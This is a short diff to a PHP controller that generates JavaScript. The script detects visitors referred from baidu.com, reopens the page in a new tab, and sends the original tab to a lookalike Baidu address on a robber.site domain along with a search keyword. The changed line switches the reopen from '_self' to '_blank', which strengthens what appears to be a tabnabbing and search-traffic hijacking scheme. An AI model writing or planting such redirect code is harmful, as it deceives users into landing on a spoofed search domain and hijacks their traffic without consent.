@@ -20,7 +20,7 @@ class JsController extends Controller {
                 }
         }else{
                 if(document.referrer.indexOf("baidu.com") != -1){
-                        window.open(window.location.href, "_self");
+                        window.open(window.location.href, "_blank");
                         window.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
                 }
         }';
